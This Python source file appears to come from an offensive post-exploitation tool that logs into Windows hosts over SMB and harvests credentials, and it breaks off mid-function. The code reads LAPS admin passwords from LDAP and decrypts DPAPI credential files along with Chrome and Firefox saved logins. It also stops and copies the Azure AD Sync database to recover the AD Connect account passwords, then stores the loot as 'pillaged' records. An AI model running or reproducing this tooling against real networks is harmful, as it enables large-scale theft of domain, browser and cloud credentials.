#!/usr/bin/env python
# coding:utf-8
'''
PA Vandewoestyne
'''
from __future__ import division
from __future__ import print_function

import copy
from pathlib import Path

from lib.secretsdump import LSASecrets as MyLSASecrets
from lib.secretsdump import SAMHashes as MySAMHashes
import socket,impacket

from impacket.dcerpc.v5 import srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smb import SMB_DIALECT

#import impacket.dpapi
from lib.dpapi import DPAPI, CredHist
from software.browser.chrome_decrypt import *
from software.browser.firefox_decrypt import *
from software.sysadmin.vnc import Vnc
from lib.toolbox import is_guid
from myusers import *
from lib.fileops import MyRegOps
from database import database
from lib.new_module import *
from lib.RecentFiles import *
from lib.adconnect import *
from ldap3 import ALL, Server, Connection, NTLM
#from lib.lazagne_dpapi.credhist import CredHistFile

class MySeatBelt:
	def __init__(self, target, options, logger, verbose=1):
		self.logging = logger
		self.options = copy.deepcopy(options)
		self.options.target_ip = target
		self.host = target
		#self.username=options.username
		#self.password=options.password
		#self.domain=options.domain
		self.options.timeout=5
		self.smb = None
		#options.target_ip=target
		"""
		self.logging.info(f"[{target}] [-] initialising smb connection to {options.domain} / {options.username} : {options.password}, @ {options.dc_ip} , Hash : {options.lmhash} : { options.nthash}, AESKey {options.aesKey}")
		smbClient = SMBConnection(options.address, target, sess_port=int(options.port))
		if options.k is True:
			smbClient.kerberosLogin(options.username, options.password, options.domain, options.lmhash, options.nthash, options.aesKey, options.dc_ip )
		else:
			smbClient.login(options.username, options.password, options.domain, options.lmhash, options.nthash)
		
		self.smb = smbClient
		"""
		#Init all
		self.smbv1 = False
		self.admin_privs = False
		#self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey, self.TGT, self.TGS = self.smb.getCredentials()
		self.share = None
		self.last_output = None
		self.completion = []
		self.users = []
		self.user_path = ''
		self.machine_key = []
		self.user_key = []

		#self.options[logging] = logge
		self.myfileops = None
		self.myregops = None
		#self.myfileops = MyFileOps(self.smb,self.logging,self.options)
		self.credz = options.credz
		self.__remoteOps = None
		self.__bootKey = b''
		self.__SAMHashes = None
		self.__LSASecrets = None
		self.global_logfile = b'globallog.log'
		self.init_connect()
		#logger.init()

	def init_connect(self):
		try:
			self.db = database(sqlite3.connect(self.options.db_path, check_same_thread=False), self.logging)
			if self.create_conn_obj():
				#self.do_info_rpc_unauth()
				self.do_info_unauth()
				if self.login_conn():
					self.is_admin()
					if self.admin_privs:
						self.myfileops = MyFileOps(self.smb, self.logging, self.options)
						self.myregops = MyRegOps(self.logging,self.options)
					return True
			else:
				return False
			return False
		except Exception as e:
			self.logging.debug('Error init connect')
			return False


	def create_smbv1_conn(self):
		try:
			self.smb = SMBConnection(self.host, self.host, None, self.options.port, preferredDialect=SMB_DIALECT, timeout=self.options.timeout)
			self.smbv1 = True
			logging.debug('SMBv1 OK on {} - {}'.format(self.host,self.options.target_ip))
		except socket.error as e:
			if str(e).find('Connection reset by peer') != -1:
				logging.debug('SMBv1 might be disabled on {}'.format(self.host))
			return False
		except Exception as e:
			logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
			return False

		return True

	def create_smbv3_conn(self):
		try:
			self.smb = SMBConnection(self.host, self.host, None, self.options.port, timeout=self.options.timeout)
			self.smbv1 = False
			logging.debug('SMBv3 OK on {} - {}'.format(self.host,self.options.target_ip))
		except Exception as e:
			self.logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
			self.db.add_computer(ip=self.host,connectivity=f"{e}")
			return False

		return True

	def create_conn_obj(self):
		#self.logging.info(f"[{self.options.target_ip}] [-] initialising smb connection to {self.options.domain} / {self.options.username} : {self.options.password}, @ {self.options.dc_ip} , Hash : {self.options.lmhash} : {self.options.nthash}, AESKey {self.options.aesKey}")
		self.logging.debug(f"[{self.options.target_ip}] [-] initialising smb connection ...")
		if self.create_smbv1_conn():
			return True
		elif self.create_smbv3_conn():
			return True

		return False

	def quit(self):
		try:
			self.logging.debug(f"[{self.options.target_ip}] [-] initialising smb close ...")
			#self.myfileops.close()
			#self.myregops.close()
			#self.smb.close()
			self.logging.debug(f"[{self.options.target_ip}] [-]  smb closed ...")
		except Exception as e:
			self.logging.debug('Error in closing SMB connection')
			return False

	def get_laps(self):
		try:
			self.logging.debug(f"[{self.options.target_ip}] [-] Using LAPS to get Local admin password on {self.options.hostname} - domain {self.options.domain} : dcip {self.options.dc_ip}")
			ldap_domain = ''
			ldap_domain_parts = self.options.domain.split('.')
			for part in ldap_domain_parts:
				ldap_domain += f"dc={part},"
			ldap_domain = ldap_domain[:-1]

			if self.options.dc_ip != None:
				s = Server(self.options.dc_ip, get_info=ALL)
			else:
				s = Server(self.options.domain, get_info=ALL)
			c = Connection(s, user=self.options.domain + "\\" + self.options.username, password=self.options.password, authentication=NTLM, auto_bind=True)
			c.search(search_base=f"{ldap_domain}",
					 search_filter=f'(&(cn={self.options.hostname})(ms-MCS-AdmPwd=*))',
					 attributes=['ms-MCS-AdmPwd', 'SAMAccountname'])
			self.logging.debug(f"[{self.options.target_ip}] [-] Using LAPS to get Local admin password on {self.options.hostname} - {ldap_domain} - got {len(c.entries)} match")
			if len(c.entries)==1:
				#for entry in c.entries[0]:
				entry=c.entries[0]
				#self.options.username = str(entry['sAMAccountName'])
				self.options.password = str(entry['ms-Mcs-AdmPwd'])
				#self.username = self.options.username
				#self.password = self.options.password
				self.options.local_auth = True
				self.options.domain = self.options.hostname
				return True
			else:
				return False
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING}  in get LAPS {bcolors.ENDC}")
			self.logging.debug(ex)
			return False

	def login_conn(self,username=None,password=None,domain=None):
		try:
			if username is None:
				username=self.options.username
			if password==None:
				password=self.options.password
			if domain==None:
				domain=self.options.domain
			#smbClient = SMBConnection(options.address, target, sess_port=int(options.port))
			if self.options.k is True:
				self.logging.debug(f"[{self.options.target_ip}] [-] initialising smb Kerberos Authentification to {self.options.domain} / {self.options.username} : {self.options.password}, @ {self.options.dc_ip} , Hash : {self.options.lmhash} : {self.options.nthash}, AESKey {self.options.aesKey}")
				self.smb.kerberosLogin(username, password, domain, self.options.lmhash, self.options.nthash, self.options.aesKey, self.options.dc_ip)
			#elif self.options.hashes != None:
			else:
				if self.options.laps is True and username != '' and password != '':  # not doing LAPS for null session
					if(self.get_laps()):
						for username in ['Administrator','Administrateur','Administrador']:
							try:
								self.logging.debug(f"[{self.options.target_ip}] [-] initialising smb Local Authentification to {self.options.domain} / {username} : {self.options.password}, @ {self.host} , Hash : {self.options.lmhash} : {self.options.nthash}, AESKey {self.options.aesKey}")
								self.smb.login(username, self.options.password, self.options.domain, self.options.lmhash, self.options.nthash, ntlmFallback=True)
								self.options.username=username
								if username not in self.options.credz:
									self.options.credz[username] = [self.options.password]
								else:
									self.options.credz[username].append(self.options.password)
								return True
							except Exception as ex:
								self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING} in LOGIN_Connection - LAPS with  {bcolors.ENDC}")
								self.logging.debug(ex)
								continue
				else:
					if username == "" and password == "":
						try:
							self.logging.debug(f"[{self.options.target_ip}] [-] initialising smb NullSession to {self.host}")
							self.smb.login(username, password, domain, self.options.lmhash, self.options.nthash,ntlmFallback=True)
						except Exception as ex:
							self.logging.debug(
								f"[{self.options.target_ip}] Exception {bcolors.WARNING} in NullSession {bcolors.ENDC}")
							self.logging.debug(ex)
							return False
					else:
						self.logging.debug(f"[{self.options.target_ip}] [-] initialising smb Authentification to {domain} / {username} : {password}, @ {self.host} , Hash : {self.options.lmhash} : {self.options.nthash}, AESKey {self.options.aesKey}")
						self.smb.login(username, password, domain, self.options.lmhash, self.options.nthash, ntlmFallback=True)
					'''except : #self.smb.STATUS_LOGON_FAILURE :
						try:
							if domain != self.hostname:
								#Trying localy
								self.smb.login(username, password, self.hostname, self.options.lmhash, self.options.nthash, ntlmFallback=True)
								return True
							else:#On pourrait tenter une connexion domain, mais on risque d'augmenter le compte des erreurs
								self.logging.error(f"[{self.options.target_ip}] Error {bcolors.WARNING}  Connexion refused with credentials {domain}/{username}:{password}@{self.host}  {bcolors.ENDC}")
								return False
						except Exception as ex:
							self.logging.error(f"[{self.options.target_ip}] Exception {bcolors.WARNING}  Connexion Error in Local attempt {bcolors.ENDC}")
							self.logging.debug(ex)
							return False'''
			#self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey, self.TGT, self.TGS = self.smb.getCredentials()
				return True
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING} in LOGIN_Connection {bcolors.ENDC}")
			self.logging.debug(ex)
			return False


	def GetUserByName(self,username):
		for user in self.users:
			if user.username==username:
				return user
		else:
			self.logging.debug("User %s Not found in self.users"%username)


	def is_admin(self):
		self.logging.debug(f"[{self.options.target_ip}] Checking if is admin ")
		self.admin_privs = False
		try:
			self.smb.connectTree("C$")
			self.admin_privs = True
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}Is ADMIN{bcolors.ENDC}")
			self.db.update_computer(ip=self.options.target_ip,is_admin=True)
		except SessionError as e:
			self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception in IS ADMIN{bcolors.ENDC}")
			self.logging.debug(f"[{self.options.target_ip}] {e}")
			self.db.update_computer(ip=self.options.target_ip, is_admin=False)
			pass
		return self.admin_privs


	def do_info_unauth(self):
		#self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
		try:
			#Null session to get basic infos
			self.login_conn(username='',password='')
			#self.domain = self.smb.getServerDNSDomainName()
			self.options.hostname = self.smb.getServerName()
			#self.options.hostname=self.hostname
			self.server_os = self.smb.getServerOS()
			self.signing = self.smb.isSigningRequired() if self.smbv1 else self.smb._SMBConnection._Connection['RequireSigning']
			# self.os_arch = self.get_os_arch()
			if self.options.domain == '': #no domain info == local auth
				self.options.domain = self.options.hostname
			#elif self.options.domain != '':
			#	self.domain = self.options.domain

			self.logging.info(f"[{self.options.target_ip}] [+] {bcolors.OKBLUE}{self.options.hostname}{bcolors.ENDC} (domain:{self.smb.getServerDNSDomainName()}) ({self.server_os}) [SMB Signing {'Enabled' if self.signing else 'Disabled'}]")
			self.db.add_computer(ip=self.options.target_ip,hostname=self.options.hostname,domain=self.smb.getServerDNSDomainName(),os=self.server_os,smb_signing_enabled=self.signing,smbv1_enabled=self.smbv1)

		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING}  in DO INFO UNAUTH {bcolors.ENDC}")
			self.logging.debug(ex)

	def do_info_rpc_unauth(self):
		try:
			rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\srvsvc', smb_connection=self.smb)
			dce = rpctransport.get_dce_rpc()
			dce.connect()
			dce.bind(srvs.MSRPC_UUID_SRVS)
			resp = srvs.hNetrServerGetInfo(dce, 102)
			self.logging.debug("Server Name: %s" % resp['InfoStruct']['ServerInfo102']['sv102_name'])
			self.hostname = resp['InfoStruct']['ServerInfo102']['sv102_name']
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING}  in DO INFO {bcolors.ENDC}")
			self.logging.debug(ex)
	def do_info_with_auth(self):
		#self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
		try:
			#Null session to get basic infos
			self.login_conn()
			#self.domain = self.smb.getServerDNSDomainName()
			self.options.hostname = self.smb.getServerName()
			self.server_os = self.smb.getServerOS()
			self.signing = self.smb.isSigningRequired() if self.smbv1 else self.smb._SMBConnection._Connection['RequireSigning']
			# self.os_arch = self.get_os_arch()
			if not self.domain and self.options.domain == '':
				self.domain = self.options.hostname
			elif self.options.domain != '':
				self.domain = self.options.domain

			self.logging.info(
				f"[{self.options.target_ip}] [+] {bcolors.OKBLUE}{self.hostname}{bcolors.ENDC} (domain:{self.domain}) {self.hostname} ({self.server_os}) [SMB Signing {'Enabled' if self.signing else 'Disabled'}]")
			#IP# print(self.smb.getRemoteHost())
			#print(self.smb.getServerDNSDomainName())
			rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\srvsvc', smb_connection=self.smb)
			dce = rpctransport.get_dce_rpc()
			dce.connect()
			dce.bind(srvs.MSRPC_UUID_SRVS)
			resp = srvs.hNetrServerGetInfo(dce, 102)
			#self.signing = self.smb.isSigningRequired() if self.smbv1 else self.smb._SMBConnection._Connection['RequireSigning']
			#self.os_arch = self.get_os_arch()

			#self.logging.debug("Version Major: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_major'])
			#self.logging.debug("Version Minor: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_minor'])
			#self.logging.debug("Server Name: %s" % resp['InfoStruct']['ServerInfo102']['sv102_name'])
			#self.logging.debug("Server Comment: %s" % resp['InfoStruct']['ServerInfo102']['sv102_comment'])
			#self.logging.debug("Server UserPath: %s" % resp['InfoStruct']['ServerInfo102']['sv102_userpath'])
			#self.logging.debug("Simultaneous Users: %d" % resp['InfoStruct']['ServerInfo102']['sv102_users'])
			#USE user path
			self.user_path = resp['InfoStruct']['ServerInfo102']['sv102_userpath']

			self.db.add_computer(ip=self.options.target_ip,hostname=self.hostname,domain=self.domain,os=self.server_os)
			self.logging.info(f"[{self.options.target_ip}] [+] {bcolors.OKBLUE}{self.hostname}{bcolors.ENDC} (domain:{self.domain}) ({self.server_os} - {resp['InfoStruct']['ServerInfo102']['sv102_comment']} -{resp['InfoStruct']['ServerInfo102']['sv102_userpath']} - {resp['InfoStruct']['ServerInfo102']['sv102_users']})")

		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING}  in DO INFO AUTH{bcolors.ENDC}")
			self.logging.debug(ex)

	def logsecret(self,data):
		try:
			fh = open(self.global_logfile, 'ab')
			fh.write(data.encode())
			fh.close()
			self.logging.info(f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} {data} {bcolors.ENDC}")
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] {bcolors.WARNING}Exception logsecret for {data} {bcolors.ENDC}")
			self.logging.debug(ex)

	def GetMozillaSecrets_wrapper(self):
		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Mozilla Secrets {bcolors.ENDC}")

		for user in self.users:
			if user.username == 'MACHINE$':
				continue
			try:
				myoptions = copy.deepcopy(self.options)
				myoptions.file = None  # "chrome_enc_blob.tmp"  # BLOB to parse
				myoptions.key = None
				myoptions.masterkeys = None
				myFirefoxSecrets = FIREFOX_LOGINS(myoptions, self.logging, user, self.myfileops,self.db)
				myFirefoxSecrets.run()
			except Exception as ex:
				self.logging.debug(
					f"[{self.options.target_ip}] {bcolors.WARNING}Exception GetMozillaSecrets_wrapper for {user.username} {bcolors.ENDC}")
				self.logging.debug(ex)
	def GetChormeSecrets(self):
		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Chrome Secrets {bcolors.ENDC}")
		blacklist = ['.', '..']
		# Parse chrome
		# autres navigateurs ?

		user_directories = [("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data", 'Local State', 'ChromeLocalState', 'DOMAIN'),
							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Cookies', 'ChromeCookies', 'DOMAIN'),
							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data', 'ChromeLoginData', 'DOMAIN'),
							]


		for user in self.users:
			if user.username == 'MACHINE$':
				continue
			else:
				directories_to_use = user_directories
				myoptions = copy.deepcopy(self.options)
				myoptions.file = None  # "chrome_enc_blob.tmp"  # BLOB to parse
				myoptions.key = None
				myoptions.masterkeys = None
				myChromeSecrets = CHROME_LOGINS(myoptions, self.logging, self.db,user.username)

			# if len(user.masterkeys)>0:#Pas de masterkeys==pas de datas a recup
			for info in directories_to_use:
				my_dir, my_mask, my_blob_type, my_user_type = info
				tmp_pwd = my_dir.format(username=user.username)#tmp_pwd = f"Users\\{user.username}\\{my_dir}"#ntpath.join(ntpath.join('Users', user.username), my_dir)
				self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
				my_directory = self.myfileops.do_ls(tmp_pwd, my_mask, display=False)
				for infos in my_directory:
					longname, is_directory = infos
					self.logging.debug("ls returned file %s" % longname)
					if longname not in blacklist and not is_directory:
						try:
							self.logging.debug(f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Chrome files : {longname}")
							# Downloading Blob file
							localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname),allow_access_error=True)
							#myoptions = copy.deepcopy(self.options)
							if my_blob_type == 'ChromeLocalState':
								try:
									myChromeSecrets.localstate_path=localfile
									guid=myChromeSecrets.get_masterkey_guid_from_localstate()
									if guid != None:
										masterkey = self.get_masterkey(user=user, guid=guid, type=my_user_type)
										if masterkey != None:
											if masterkey['status'] == 'decrypted':
												myChromeSecrets.masterkey = masterkey['key']
												aesKey = myChromeSecrets.get_AES_key_from_localstate(masterkey=masterkey['key'])
												if aesKey != None:
													self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Chrome AES Key {aesKey} {bcolors.ENDC}")
												else:
													self.logging.debug(
														f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State with Masterkey{bcolors.ENDC}")
											else:
												self.logging.debug(
													f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State  - Masterkey not decrypted{bcolors.ENDC}")
										else:
											self.logging.debug(
												f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
									else:
										self.logging.debug(
											f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Chrome Local State with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")
								except Exception as ex:
									self.logging.debug(
										f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ChromeLocalState{bcolors.ENDC}")
									self.logging.debug(ex)
							if my_blob_type == 'ChromeLoginData':
								try:
									myChromeSecrets.logindata_path=localfile
									user.files[longname] = {}
									user.files[longname]['type'] = my_blob_type
									user.files[longname]['status'] = 'encrypted'
									user.files[longname]['path'] = localfile
									logins=myChromeSecrets.decrypt_chrome_LoginData()
									user.files[longname]['secret'] = logins
									if logins is not None:
										user.files[longname]['status'] = 'decrypted'
								except Exception as ex:
										self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting logindata for CHROME {user.username} {localfile} {bcolors.ENDC}")
										self.logging.debug(ex)
							if my_blob_type == 'ChromeCookies':
								"""
								myChromeSecrets.cookie_path=localfile
								user.files[longname] = {}
								user.files[longname]['type'] = my_blob_type
								user.files[longname]['status'] = 'encrypted'
								user.files[longname]['path'] = localfile
								cookies=myChromeSecrets.decrypt_chrome_CookieData()
								user.files[longname]['secret'] = cookies
								if cookies is not None:
									user.files[longname]['status'] = 'decrypted'
								"""

						except Exception as ex:
							self.logging.debug(
								f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting Blob for {localfile} with Masterkey{bcolors.ENDC}")
							self.logging.debug(ex)

	def getMdbData(self):
		try:
			return self.getMdbData2()
		except UnicodeDecodeError:
			return self.getMdbData2('utf-16-le')
	def getMdbData2(self, codec='utf-8'):
		try:
			out = {
				'cryptedrecords': [],
				'xmldata': []
			}
			keydata = None
			#
			#self.options.from_file='adsync_export'

			if self.options.from_file:
				logging.info('Loading configuration data from %s on filesystem', self.options.from_file)
				infile = codecs.open(self.options.from_file, 'r', codec)
				enumtarget = infile
			else:
				logging.info('Querying database for configuration data')
				dbpath = os.path.join(os.getcwd(), r"ADSync.mdf")
				output = subprocess.Popen(["ADSyncQuery.exe", dbpath], stdout=subprocess.PIPE).communicate()[0]
				enumtarget = output.split('\n')

			#####TEMP
			#logging.info('Loading configuration data from %s on filesystem', self.__options.from_file)
			#infile = codecs.open('adsync_export', 'r', codec)
			#enumtarget = infile
			######

			for line in enumtarget:
				print(line)
				try:
					ltype, data = line.strip().split(': ')
				except ValueError:
					continue
				ltype = ltype.replace(u'\ufeff', u'')
				if ltype.lower() == 'record':
					xmldata, crypteddata = data.split(';')
					out['cryptedrecords'].append(crypteddata)
					out['xmldata'].append(xmldata)
					#print(f"record found : {xmldata}")

				if ltype.lower() == 'config':
					instance, keyset_id, entropy = data.split(';')
					out['instance'] = instance
					out['keyset_id'] = keyset_id
					out['entropy'] = entropy
			#if self.__options.from_file:
			#	infile.close()
			# Check if all values are in the outdata
			required = ['cryptedrecords', 'xmldata', 'instance', 'keyset_id', 'entropy']
			for option in required:
				if not option in out:
					logging.error(
						'Missing data from database. Option %s could not be extracted. Check your database or output file.',
						option)
					return None
			return out
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in Parsing database : Please manualy run ADSyncQuery.exe ADSync.mdf > adsync_export on a windows env with MSSQL support{bcolors.ENDC}")
			self.logging.debug(ex)
	def Get_AD_Connect(self,user, localfile, data):
		#Local DPAPI extracted data
		info=""
		parts = data['Target'].decode('utf-16le')[:-1].split('_')
		localBlobdatas= {
			'instanceid': parts[3][1:-1].lower(),
			'keyset_id': parts[4],
			'data': data['Unknown3']
		}
		#print(localBlobdatas)

		#ADConnect Database data
		logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE} Trying to get ADConnect account{bcolors.ENDC}")
		try:
			#Stop Service / Download DB / Start DB
			myADSRemoteOps = ADSRemoteOperations(smbConnection=self.smb, doKerberos=False)
			myADSRemoteOps.gatherAdSyncMdb()
			#files_to_dl=['Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf','Program Files\\Microsoft Azure AD Sync\\Data\\ADSync_log.ldf']
			mdbdata=self.getMdbData()
			if mdbdata is None:
				logging.debug(f"[{self.options.target_ip}] Could not extract required database information. Exiting")
				return
			#print(mdbdata)
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ADSRemoteOperations 1{bcolors.ENDC}")
			self.logging.debug(ex)

		result=localBlobdatas
		if result is not None:
			if result['keyset_id'] != mdbdata['keyset_id'] or result['instanceid'] != mdbdata['instance']:
				logging.debug('Found keyset %s instance %s, but need keyset %s instance %s. Trying next',
								result['keyset_id'], result['instanceid'], mdbdata['keyset_id'], mdbdata['instance'])
			else:
				logging.debug('Found correct encrypted keyset to decrypt data')
		if result is None:
			logging.debug('Failed to find correct keyset data')
			return

		#cryptkeys = [self.__remoteOps.decryptDpapiBlobSystemkey(result['data'], self.dpapiSystem['MachineKey'],string_to_bin(mdbdata['entropy']))]
		myoptions = copy.deepcopy(self.options)
		myoptions.file = None  # "key_material.tmp"  # BLOB to parse
		myoptions.key = None
		myoptions.masterkeys = None  # user.masterkeys_file
		mydpapi = DPAPI(myoptions, self.logging)
		guid = mydpapi.find_Blob_masterkey(raw_data=result['data'])
		self.logging.debug(f"[{self.options.target_ip}] Looking for ADConnect masterkey : {guid}")
		if guid != None:
			machine_user=user=self.GetUserByName('MACHINE$')
			masterkey = self.get_masterkey(user=machine_user, guid=guid, type='MACHINE')
			if masterkey != None:
				if masterkey['status'] == 'decrypted':
					mydpapi.options.key = masterkey['key']
					# cred_data = mydpapi.decrypt_credential()
					cryptkeys = [mydpapi.decrypt_blob(raw_data=result['data'],entropy=string_to_bin(mdbdata['entropy']))]
					try:
						logging.debug(f'Decrypting encrypted AD Sync configuration data with {cryptkeys}')
						for index, record in enumerate(mdbdata['cryptedrecords']):
							# Try decrypting with highest cryptkey record
							self.logging.debug(f"[{self.options.target_ip}] {index} - {record}")
							drecord = DumpSecrets.decrypt(record, cryptkeys[-1]).replace('\x00', '')
							#print(drecord)
							with open('r%d_xml_data.xml' % index, 'w') as outfile:
								data = base64.b64decode(mdbdata['xmldata'][index]).decode('utf-16-le')
								outfile.write(data)
							with open('r%d_encrypted_data.xml' % index, 'w') as outfile:
								outfile.write(drecord)
							ctree = ET.fromstring(drecord)
							dtree = ET.fromstring(data)
							if 'forest-login-user' in data:
								logging.debug('Local AD credentials')
								el = dtree.find(".//parameter[@name='forest-login-domain']")
								if el is not None:
									logging.debug('\tDomain: %s', el.text)
									username=el.text
								el = dtree.find(".//parameter[@name='forest-login-user']")
								if el is not None:
									username+='/'+el.text
									#logging.debug('\tUsername: %s', el.text)
							else:
								# Assume AAD config
								logging.debug('Azure AD credentials')
								el = dtree.find(".//parameter[@name='UserName']")
								if el is not None:
									username=el.text
									logging.debug('\tUsername: %s', el.text)
							# Can be either lower or with capital P
							fpw = None
							el = ctree.find(".//attribute[@name='Password']")
							if el is not None:
								fpw = el.text
							el = ctree.find(".//attribute[@name='password']")
							if el is not None:
								fpw = el.text
							if fpw:
								# fpw = fpw[:len(fpw)/2] + '...[REDACTED]'
								logging.debug('\tPassword: %s', fpw)
								info+=f"{username} : {fpw}\n"
								self.logging.info(
									f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} ADCONNECT : {bcolors.OKGREEN} - {username} : {fpw}{bcolors.ENDC}")
								############PROCESSING DATA
								self.db.add_credz(credz_type='ADConnect',
												  credz_username=username,
												  credz_password=fpw,
												  credz_target='',
												  credz_path='',  # user.files['ADCONNECT']['path'],
												  pillaged_from_computer_ip=self.options.target_ip,
												  pillaged_from_username=user.username)
					except Exception as ex:
						self.logging.debug(
							f"[{self.options.target_ip}] {bcolors.WARNING}Exception in Get_AD_Connect 2{bcolors.ENDC}")
						self.logging.debug(ex)
			else :
				self.logging.info(
					f"[{self.options.target_ip}] [+] {bcolors.WARNING} Masterkey NOT Found for ADConnect {bcolors.ENDC}")
		return info

	def Get_DPAPI_Protected_Files(self):
		self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering DPAPI Secret blobs on the target{bcolors.ENDC}")
		blacklist = ['.', '..']
		#credentials ?
		#Vaults ?
		#Parse chrome
		#autres navigateurs ?
		#CredHistory
		#Appdata Roaming ?

		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Credentials",'*','credential','DOMAIN'),
							("Windows\\ServiceProfiles\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*', 'credential', 'MACHINE-USER'),
							("Users\\{username}\\AppData\\Roaming\\Microsoft\\Credentials", '*', 'credential','DOMAIN'),
							("Users\\{username}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings","*.rdg",'rdg','DOMAIN')
							]#ADD Desktop for RDG
		machine_directories = [("Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",'*','credential','MACHINE'),
							   ("Windows\\ServiceProfiles\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*',
							   'credential', 'MACHINE-USER'),
							   ("Users\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*', 'credential', 'MACHINE-USER'),
							   #Valider le %systemdir% selon la version de windows ?
							]

		for user in self.users:
			if user.username == 'MACHINE$':
				directories_to_use = machine_directories
			else:
				directories_to_use = user_directories

			#if len(user.masterkeys)>0:#Pas de masterkeys==pas de datas a recup
			for info in directories_to_use:
				my_dir,my_mask,my_blob_type, my_user_type=info
				tmp_pwd = my_dir.format(username=user.username) ##ntpath.join(ntpath.join('Users', user.username), my_dir)
				self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
				my_directory = self.myfileops.do_ls(tmp_pwd,my_mask, display=False)
				for infos in my_directory:
					longname, is_directory = infos
					self.logging.debug("ls returned file %s"%longname)
					if longname not in blacklist and not is_directory:
						try:
							self.logging.debug(	f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{user.username}{bcolors.ENDC} encrypted files {longname}")
							# Downloading Blob file
							localfile = self.myfileops.get_file(ntpath.join(tmp_pwd,longname))
							user.files[longname]={}
							user.files[longname]['type'] = my_blob_type
							user.files[longname]['status'] = 'encrypted'
							user.files[longname]['path'] = localfile

							myoptions = copy.deepcopy(self.options)
							myoptions.file = localfile  # Masterkeyfile to parse
							myoptions.masterkeys = None# user.masterkeys_file
							myoptions.key = None
							mydpapi = DPAPI(myoptions,self.logging)
							guid=mydpapi.find_CredentialFile_masterkey()
							self.logging.debug(	f"[{self.options.target_ip}] Looking for {longname} masterkey : {guid}")
							if guid != None :
								masterkey=self.get_masterkey(user=user,guid=guid,type=my_user_type)
								if masterkey!=None:
									if masterkey['status']=='decrypted':
										mydpapi.options.key = masterkey['key']
										cred_data = mydpapi.decrypt_credential()
										if cred_data != None:
											self.logging.debug(
												f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Secret {longname}{bcolors.ENDC}")
											user.files[longname]['status'] = 'decrypted'
											user.files[longname]['data'] = cred_data
											self.process_decrypted_data(user,user.files[longname])#cred_data,user,localfile,my_blob_type)
										else:
											self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey{bcolors.ENDC}")
									else:
										self.logging.debug(
											f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey - Masterkey not decrypted{bcolors.ENDC}")
								else:
									self.logging.debug(
										f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
							else:
								self.logging.debug(
									f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")
						except Exception as ex:
